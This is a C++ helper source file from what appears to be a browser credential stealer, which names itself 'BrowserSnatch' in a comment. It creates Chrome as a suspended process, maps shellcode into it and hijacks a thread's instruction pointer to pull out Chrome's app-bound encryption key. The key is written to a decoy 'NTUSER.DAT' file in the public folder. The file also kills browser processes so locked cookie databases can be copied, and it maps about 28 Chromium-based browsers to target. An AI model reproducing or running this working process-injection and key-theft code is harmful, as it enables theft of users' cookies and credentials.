#include "includes/Helper.h"

BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinationFile) {
	std::ifstream source(sourceFile, std::ios::binary);
	if (!source) {
		return false;
	}

	std::ofstream dest(destinationFile, std::ios::binary);
	if (!dest) {
		return false;
	}

	dest << source.rdbuf();

	if (!dest.good()) {
		return false;
	}

	//std::cout << "File copied successfully." << std::endl;
	return true;
}

sqlite3_stmt* query_database(std::string target_data, const char* database_query)
{
	sqlite3* db;
	if (sqlite3_open(target_data.c_str(), &db) == SQLITE_OK)
	{
		//std::cout << "file found" << std::endl;
		sqlite3_stmt* stmt = nullptr;
		if (sqlite3_prepare_v2(db, database_query, -1, &stmt, 0) == SQLITE_OK)
		{
			return stmt;
		}
		else
		{
			//std::cerr << "Database file in use .... " << std::endl;
			std::string new_target = target_data + " copy";
			custom_copy_file(target_data, new_target);

			sqlite3_open(new_target.c_str(), &db);
			if (sqlite3_prepare_v2(db, database_query, -1, &stmt, 0) == SQLITE_OK)
			{
				return stmt;
			}
			else
			{
				//std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
				return stmt;
			}
		}
	}
	return nullptr;
}

BOOL kill_process(std::string process_path)
{
	std::string process_name = GetBrowserProcessName(process_path);

	if (process_name == "")
		return false;

	// Convert std::string to LPCWSTR (wide string)
	std::wstring wProcessName(process_name.begin(), process_name.end());

	// Get a snapshot of all processes in the system
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		//std::cerr << "Failed to create snapshot." << std::endl;
		return false;
	}

	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process
	if (!Process32First(hSnapshot, &processEntry)) {
		//std::cerr << "Failed to retrieve process information." << std::endl;
		CloseHandle(hSnapshot);
		return false;
	}

	// Iterate through all processes in the snapshot
	do {
		if (!_wcsicmp(processEntry.szExeFile, wProcessName.c_str())) {
			// Open the process with terminate rights
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
			if (hProcess != NULL) {
				// Terminate the process
				if (TerminateProcess(hProcess, 0)) {
					continue;
				}
				else {
					//std::cerr << "Failed to terminate process: " << process_name << " (PID: " << processEntry.th32ProcessID << ")" << std::endl;
					continue;
				}
				CloseHandle(hProcess);
			}
			else {
				//std::cerr << "Failed to open process: " << process_name << " (PID: " << processEntry.th32ProcessID << ")" << std::endl;
				continue;
			}
		}
	} while (Process32Next(hSnapshot, &processEntry));

	CloseHandle(hSnapshot);
	return true;
}

DWORD Enumeration(const wchar_t* proc_name)
{
	DWORD processID = 0;

	// Take a snapshot of all processes in the system
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("Error: Couldn't create process snapshot. Error code: %d\n", GetLastError());
		return -1;
	}

	// Initialize the process entry structure
	PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };

	// Retrieve information about processes in the snapshot
	if (!Process32First(hSnapshot, &pe32)) {
		printf("Error: Couldn't retrieve process information. Error code: %d\n", GetLastError());
		CloseHandle(hSnapshot);
		return -1;
	}

	// Search for the process
	do {
		if (wcscmp(pe32.szExeFile, proc_name) == 0) {
			//wprintf(L"PID of process: %d\n", pe32.th32ProcessID);
			processID = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapshot, &pe32));

	//Close the snapshot handle
	CloseHandle(hSnapshot);

	if (processID == 0)
	{
		std::cout << "Couldn't retrieve process ID..." << std::endl;
		return processID;
	}

	return processID;
}

DWORD CreateSuspendedProcess(LPCWSTR applicationPath) {
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;

	// Create the process in a suspended state
	if (CreateProcess(
		applicationPath,       // Path to the executable
		nullptr,               // Command line arguments
		nullptr,               // Process handle not inheritable
		nullptr,               // Thread handle not inheritable
		FALSE,                 // Set handle inheritance to FALSE
		CREATE_SUSPENDED,      // Creation flag to start in suspended state
		nullptr,               // Use parent's environment block
		nullptr,               // Use parent's starting directory
		&si,                   // Pointer to STARTUPINFO structure
		&pi                    // Pointer to PROCESS_INFORMATION structure
	)) {
		DWORD pid = pi.dwProcessId;

		// Close thread and process handles (we only need the PID)
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);

		return pid;  // Return the PID of the suspended process
	}
	else {
		//std::cerr << "Failed to start process. Error: " << GetLastError() << "\n";
		return 0;  // Return 0 if the process could not be created
	}
}

std::string retrieve_chrome_key()
{
	std::string extracted_key = "";
	int target_process_id = CreateSuspendedProcess(L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");

	if (target_process_id == 0)
		target_process_id = CreateSuspendedProcess(L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe");

	//int target_process_id = Enumeration(L"chrome.exe");

	/*
	* The resource is shellcode used to extract chrome app-bound encrypted key
	* The shellcode is injected into chrome itself to bypass app-bound checks
	* The decrypted key is saved as a dat file in public which is used by BrowserSnatch for cookies decryption
	* The ChromeInjector project contains the code for retrieving app-bound decrypted key and converted into shellcode by tool named Donut
	* The shellcode for extracting key is available in Chrome_key_retriever_shellcode/extract_key.bin
	* Simply import the .bin file as a custom BINARY resource
	*/
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(102), L"BINARY");
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	HGLOBAL shellcodeResourceData = LoadResource(NULL, shellcodeResource);

	HINSTANCE hNtdll = LoadLibrary(L"ntdll.dll");
	myNtCreateSection fNtCreateSection = (myNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection"); //std::cout << "NtCreateSection Loaded..." << std::endl;
	myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection"); //std::cout << "NtMapViewOfSection Loaded..." << std::endl;
	myNtOpenProcess fNtOpenProcess = (myNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess"); //std::cout << "NtOpenProcess Loaded..." << std::endl;
	myNtOpenThread fNtOpenThread = (myNtOpenThread)GetProcAddress(hNtdll, "NtOpenThread"); //std::cout << "NtOpenThread Loaded..." << std::endl;
	myNtSuspendThread fNtSuspendThread = (myNtSuspendThread)GetProcAddress(hNtdll, "NtSuspendThread"); //std::cout << "NtSuspendThread Loaded..." << std::endl;
	myNtGetContextThread fNtGetContextThread = (myNtGetContextThread)GetProcAddress(hNtdll, "NtGetContextThread"); //std::cout << "NtGetContextThread Loaded..." << std::endl;
	myNtSetContextThread fNtSetContextThread = (myNtSetContextThread)GetProcAddress(hNtdll, "NtSetContextThread"); //std::cout << "NtSetContextThread Loaded..." << std::endl;
	myNtResumeThread fNtResumeThread = (myNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread"); //std::cout << "NtResumeThread Loaded..." << std::endl;

	SIZE_T size = shellcodeSize; //size for section
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

	// create a memory section
	//std::cout << "[x] Creating and mapping view of section in local process...!!!" << std::endl;
	fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// create a view of the memory section in the local process
	fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

	// create a view of the memory section in the target process
	//std::cout << "[x] Creating and mapping view of section in target process...!!!" << std::endl;
	HANDLE targetHandle;
	OBJECT_ATTRIBUTES objAttr;
	CLIENT_ID cID;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	cID.UniqueProcess = (PVOID)target_process_id;
	cID.UniqueThread = NULL;

	fNtOpenProcess(&targetHandle, PROCESS_ALL_ACCESS, &objAttr, &cID);
	if (!targetHandle)
	{
		//std::cerr << "Failed to get process handle\n";
		return "";
	}

	//HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, target_process_id);
	fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

	// copy shellcode to the local view, which will get reflected in the target process's mapped view
	//std::cout << "[x] Writing shellcode buffer in shared memory region...!!!" << std::endl;
	memcpy(localSectionAddress, shellcodeResourceData, size);

	// Find the target thread in the target process
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 te;
	te.dwSize = sizeof(THREADENTRY32);
	DWORD threadID = 0;

	if (Thread32First(hSnapshot, &te)) {
		do {
			if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) +
				sizeof(te.th32OwnerProcessID)) {
				if (te.th32OwnerProcessID == target_process_id) {
					threadID = te.th32ThreadID;
					break;
				}
			}
			te.dwSize = sizeof(THREADENTRY32);
		} while (Thread32Next(hSnapshot, &te));
	}
	CloseHandle(hSnapshot);

	// Open the target thread
	HANDLE targetThreadHandle;
	cID.UniqueThread = (PVOID)threadID;
	fNtOpenThread(&targetThreadHandle, PROCESS_ALL_ACCESS, &objAttr, &cID);

	if (!targetThreadHandle) {
		//std::cerr << "Failed to get thread handle\n";
		return "";
	}

	// Suspend the target thread
	//std::cout << "[x] Hijacking target process thread...!!!" << std::endl;
	myNtSuspendThread((HANDLE)(targetThreadHandle));

	// Get the context of the target thread
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	fNtGetContextThread(targetThreadHandle, &ctx);

	// Save Context.rip
	uintptr_t saved_context = ctx.Rip;

	// Modify the instruction pointer to point to the shellcode
	ctx.Rip = (DWORD64)remoteSectionAddress;

	// Set the modified context
	fNtSetContextThread(targetThreadHandle, &ctx);
	//std::cout << "Thread context changed to malicious buffer..." << std::endl;

	// Resume the target thread
	PULONG temp = 0; //its required by VStudio, even though i have defined it as optional (weird)
	fNtResumeThread(targetThreadHandle, temp);
	//std::cout << "Thread resumed..." << std::endl;

	CloseHandle(targetThreadHandle);

	//sleep for few seconds
	std::this_thread::sleep_for(std::chrono::seconds(3));

	std::string extracted_dat = "C:\\users\\public\\";
	extracted_dat = extracted_dat + "NTUSER.DAT";
	
	if (std::filesystem::exists(extracted_dat))
	{
		extracted_key = readFileContent(extracted_dat);
		return extracted_key;
	}
	return "";
}

std::string readFileContent(const std::string& filename) {
	std::ifstream file(filename);
	if (!file) {
		throw std::runtime_error("Unable to open file.");
	}

	// Read file content into a string
	std::string content((std::istreambuf_iterator<char>(file)),
		(std::istreambuf_iterator<char>()));

	// Check and remove last two characters if they are a space and newline
	if (content.size() >= 2 && content[content.size() - 2] == ' ' && content[content.size() - 1] == '\n') {
		content.erase(content.size() - 2, 2);
	}

	return content;
}

std::string GetBrowserProcessName(const std::string& browserFolder) {
	// Map to associate browser folder paths with their process names
	static std::map<std::string, std::string> browserProcessMap = {
		{"Microsoft\\Edge\\", "msedge.exe"},
		{"Google\\Chrome\\", "chrome.exe"},
		{"Opera Software\\Opera Stable", "opera.exe"},
		{"Iridium\\", "iridium.exe"},
		{"Chromium\\", "chromium.exe"},
		{"BraveSoftware\\Brave-Browser\\", "brave.exe"},
		{"CentBrowser\\", "centbrowser.exe"},
		{"Chedot\\", "chedot.exe"},
		{"Orbitum\\", "orbitum.exe"},
		{"Comodo\\Dragon\\", "dragon.exe"},
		{"Yandex\\YandexBrowser\\", "browser.exe"},
		{"7Star\\7Star\\", "7star.exe"},
		{"Torch\\", "torch.exe"},
		{"MapleStudio\\ChromePlus\\", "chromeplus.exe"},
		{"Komet\\", "komet.exe"},
		{"Amigo\\", "amigo.exe"},
		{"Sputnik\\Sputnik\\", "sputnik.exe"},
		{"CatalinaGroup\\Citrio\\", "citrio.exe"},
		{"360Chrome\\Chrome\\", "360chrome.exe"},
		{"uCozMedia\\Uran\\", "uran.exe"},
		{"liebao\\", "liebao.exe"},
		{"Elements Browser\\", "elementsbrowser.exe"},
		{"Epic Privacy Browser\\", "epic.exe"},
		{"CocCoc\\Browser\\", "browser.exe"},
		{"Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer", "sleipnir.exe"},
		{"QIP Surf\\", "qipsurf.exe"},
		{"Coowon\\Coowon\\", "coowon.exe"},
		{"Vivaldi\\", "vivaldi.exe"}
	};

	// Find the process name in the map
	auto it = browserProcessMap.find(browserFolder);
	if (it != browserProcessMap.end()) {
		return it->second;
	}
	else {
		return "";
	}
}